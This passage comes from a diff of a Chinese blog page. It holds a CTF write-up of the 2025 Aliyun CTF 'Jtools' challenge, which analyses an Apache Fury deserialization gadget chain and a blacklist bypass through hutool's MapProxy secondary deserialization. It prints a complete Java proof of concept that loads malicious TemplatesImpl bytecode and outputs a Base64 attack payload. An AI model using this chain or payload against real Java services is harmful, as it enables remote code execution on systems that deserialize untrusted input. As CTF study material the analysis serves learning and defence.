+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133512144.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133512144.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228133512144"></p>
+<p>然后检查集合下的元素序列化器是否存在，如果不存在，根据泛型类型选择不同的读取方法。这里传进去的元素没有泛型类型就默认调用generalJavaRead</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133706640.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133706640.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228133706640"></p>
+<p>然后调用readSameTypeElements</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228134341238.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228134341238.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228134341238"></p>
+<p>readSameTypeElements内循环把每个元素序列化后的结果用add添加进collection</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228135920920.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228135920920.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228135920920"></p>
+<p>也就是说传PriorityQueue默认调用PriorityQueueSerializer去反序列化，最后会用add将队列元素添加进去。</p>
+<p>思路就理顺了，链子：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.add -&gt;</span><br><span class="line">    PropertyComparator.compare -&gt; 任意getter</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="绕黑名单"><a href="#绕黑名单" class="headerlink" title="绕黑名单"></a>绕黑名单</h3><p>别忘了上面的黑名单里面过滤了TempleatesImpl，不能直接反序列化</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228140605018.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228140605018.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228140605018"></p>
+<p>这里提一嘴为什么可以直接触发com.feilong.lib.beanutils.PropertyUtilsBean#invokeMethod，因为这个类是衍生调用到的方法，并没有经过fury反序列化，也就不会触发黑名单</p>
+<p>绕过的方式就是找一个二次反序列化的点</p>
+<p>cn.hutool.core.map.MapProxy是个代理类，看到实现了InvocationHandler</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228140952625.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228140952625.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228140952625"></p>
+<p>代理类的话条件反射看到其invoke方法，调用了Convert.convert</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228140902752.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228140902752.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228140902752"></p>
+<p>跟进两步，到达convertWithCheck，接着调用了ConverterRegistry.convert</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141111719.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141111719.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228141111719"></p>
+<p>这里如果MapProxy代理的类是个Bean，就调用BeanConverter.convert</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141221949.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141221949.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228141221949"></p>
+<p>因为BeanConverter没有这个方法，转到父类调用</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141327658.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141327658.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228141327658"></p>
+<p>convert参数不为空，且两个参数不为对方的子类，targetType不是Map的子类时，调用convertInternal</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141414089.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141414089.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228141414089"></p>
+<p>然后调用ObjectUtil.deserialize</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141640198.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141640198.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228141640198"></p>
+<p>然后跟到调用IoUtil.readObj，注意这里用ByteArrayInputStream包装了bytes</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141718797.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141718797.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228141718797"></p>
+<p>然后就是调用原生反序列化</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141809728.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141809728.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228141809728"></p>
+<p>MapProxy.invoke就是个二次反序列化的点</p>
+<p>二次反序列化就重新打一遍PriorityQueue触发到getter，也就是TemplatesImpl.getOutputProperties</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Fury.deserialize -&gt;</span><br><span class="line">    CollectionSerializer.read -&gt;</span><br><span class="line">    PriorityQueue.add -&gt;</span><br><span class="line">    PropertyComparator.compare -&gt;</span><br><span class="line">    PropertyUtilsBean.invokeMethod -&gt; getter</span><br><span class="line">    </span><br><span class="line">    MapProxy.invoke -&gt;</span><br><span class="line">    BeanConverter.convertInternal -&gt;</span><br><span class="line">    readObject -&gt; PriorityQueue.readObject -&gt;</span><br><span class="line">    TemplatesImpl.getOuputProperties</span><br></pre></td></tr></table></figure>
+
+<p>现在的问题是构造的MapProxy应该代理哪个对象的getter，注意到前面分析的时候在ConverterRegistry.convert，需要rowType满足isBean</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228144016900.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228144016900.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228144016900"></p>
+<p>也就是有setter和public 字段</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228144133243.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228144133243.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228144133243"></p>
+<p>我们又需要getter去触发到MapProxy.invoke，所以随便找个Bean接口，com.feilong.lib.digester3.ObjectCreationFactory就符合要求，propName传digester触发getter</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228144258064.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228144258064.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228144258064"></p>
+<p>官方wp有poc，就不装模做样改一下了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cn.hutool.core.map.MapProxy;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.ReflectUtil;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.SerializeUtil;</span><br><span class="line"><span class="keyword">import</span> com.feilong.core.util.comparator.PropertyComparator;</span><br><span class="line"><span class="keyword">import</span> com.feilong.lib.digester3.ObjectCreationFactory;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.fury.Fury;</span><br><span class="line"><span class="keyword">import</span> org.apache.fury.config.Language;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        declaredField.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">///templates</span></span><br><span class="line"></span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Main.class.getResourceAsStream(<span class="string">&quot;TemplatesImpl_RuntimeEvil.class&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[]   bytes       = <span class="keyword">new</span> <span class="title class_">byte</span>[inputStream.available()];</span><br><span class="line">        inputStream.read(bytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span>      <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span>    <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(tmpl, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl1</span>      <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span>    <span class="variable">bytecodes1</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes1.set(tmpl1, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name1</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name1.set(tmpl1, <span class="string">&quot;hello2&quot;</span>);</span><br><span class="line">        <span class="comment">///templates</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">prop</span> <span class="operator">=</span> <span class="string">&quot;digester&quot;</span>;</span><br><span class="line">        <span class="type">PropertyComparator</span> <span class="variable">propertyComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PropertyComparator</span>(prop);</span><br><span class="line">        <span class="type">Fury</span> <span class="variable">fury</span> <span class="operator">=</span> Fury.builder().withLanguage(Language.JAVA)</span><br><span class="line">                .requireClassRegistration(<span class="literal">false</span>)</span><br><span class="line">                .build();</span><br><span class="line">        <span class="comment">////jdk</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">templatesImpl1</span> <span class="operator">=</span> tmpl1;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> tmpl;</span><br><span class="line"></span><br><span class="line">        <span class="type">PropertyComparator</span> <span class="variable">propertyComparator1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PropertyComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, propertyComparator1);</span><br><span class="line">        ReflectUtil.setFieldValue(priorityQueue1, <span class="string">&quot;size&quot;</span>, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        Object[] objectsjdk = &#123;templatesImpl1, templatesImpl&#125;;</span><br><span class="line">        setFieldValue(priorityQueue1, <span class="string">&quot;queue&quot;</span>, objectsjdk);</span><br><span class="line">        <span class="comment">/////jdk</span></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] data = SerializeUtil.serialize(priorityQueue1);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashmap.put(prop, data);</span><br><span class="line"></span><br><span class="line">        <span class="type">MapProxy</span> <span class="variable">mapProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MapProxy</span>(hashmap);</span><br><span class="line">        <span class="type">ObjectCreationFactory</span>  <span class="variable">test</span> <span class="operator">=</span> (ObjectCreationFactory) Proxy.newProxyInstance(ObjectCreationFactory.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ObjectCreationFactory.class&#125;, mapProxy);</span><br><span class="line">        <span class="type">ObjectCreationFactory</span>  <span class="variable">test1</span> <span class="operator">=</span> (ObjectCreationFactory) Proxy.newProxyInstance(ObjectCreationFactory.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ObjectCreationFactory.class&#125;, mapProxy);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, propertyComparator);</span><br><span class="line">        ReflectUtil.setFieldValue(priorityQueue, <span class="string">&quot;size&quot;</span>, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        Object[] objects = &#123;test, test1&#125;;</span><br><span class="line">        setFieldValue(priorityQueue, <span class="string">&quot;queue&quot;</span>, objects);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] serialize = fury.serialize(priorityQueue);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目不出网，Server默认回显&#x2F;tmp&#x2F;desc.txt的内容</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228145847451.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228145847451.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228145847451"></p>
+<h2 id="Espresso-Coffee"><a href="#Espresso-Coffee" class="headerlink" title="Espresso Coffee"></a>Espresso Coffee</h2><p>尼玛，ROP我做个蛋啊。不做了</p>
 
       </div>
       <div class="post-tags-categories">
         
         <div class="tags">
           
-            <a href="/tags/%E7%B1%BB%E5%8A%A0%E8%BD%BD/" class="">
-              类加载
+            <a href="/tags/CTF/" class="">
+              CTF
             </a>
           
         </div>
@@ -714,7 +766,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2024/09/23/loadclass-he-forname-jia-zai-shu-zu-lei/" target="_blank" title="loadClass和forName加载数组类">https://godownio.github.io/2024/09/23/loadclass-he-forname-jia-zai-shu-zu-lei/</a>
+    <a href="/2025/02/28/2025aliyun-ctf-java/" target="_blank" title="2025Aliyun CTF Jtools">https://godownio.github.io/2025/02/28/2025aliyun-ctf-java/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -732,42 +784,21 @@
 
 
 
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8100.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8100.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-    </div>
-    <a href="/2024/09/25/jndi-zhu-ru/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> 上一篇:
-        <div class="title-text">JNDI注入(InitialContext.lookup)</div>
-      </div>
-      
-      <!-- <div class="content">
-        JNDI是一种命名服务，全称叫Java Naming and Directory Interface
-开发者可以讲JND
-      </div> -->
-    </a>
-  </div>
-
 
 
   
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B898.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B898.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8132.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8132.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
     </div>
-    <a href="/2024/09/20/rmi-san-duan-jrmp-ji-qi-gao-ban-ben-rao-guo/" class="post-nav-link">
+    <a href="/2025/02/26/tomcat-xia-huo-qu-standardcontext-de-fang-fa-jsp-zhuan-java-nei-cun-ma/" class="post-nav-link">
       <div class="title">
         下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">RMI三端源码分析&amp;JRMP及其高版本绕过</div>
+        <div class="title-text">Tomcat下获取StandardContext的方法(JSP转Java内存马)</div>
       </div>
       <!-- <div class="content">
-        说实话我每次看到RMI的流程我都觉得脑袋疼。而且分析完了都不记得分析了个什么鸟。
-或许这次会好一点。
-RMI远程类调用R
+        2025凑一下2020年的热闹，本文将介绍各环境下获取StandardContext的办法，以及直接写response回
       </div> -->
     </a>
   </div>
@@ -988,7 +1019,7 @@ RMI远程类调用R
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ClassLoader-loadClass%E5%92%8CClass-forName"><span class="toc-text">ClassLoader.loadClass和Class.forName</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Class-forName"><span class="toc-text">Class.forName</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ClassLoader-loadClass"><span class="toc-text">ClassLoader.loadClass</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shiro-%E4%B8%AD%E7%9A%84loadClass"><span class="toc-text">shiro 中的loadClass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2021-0ctf-buggyLoader-loadClass"><span class="toc-text">2021 0ctf buggyLoader loadClass</span></a></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Jtools"><span class="toc-text">Jtools</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E5%85%A5%E5%8F%A3"><span class="toc-text">找到入口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#compare"><span class="toc-text">compare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fury%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91compare"><span class="toc-text">fury反序列化触发compare</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-text">绕黑名单</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Espresso-Coffee"><span class="toc-text">Espresso Coffee</span></a></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
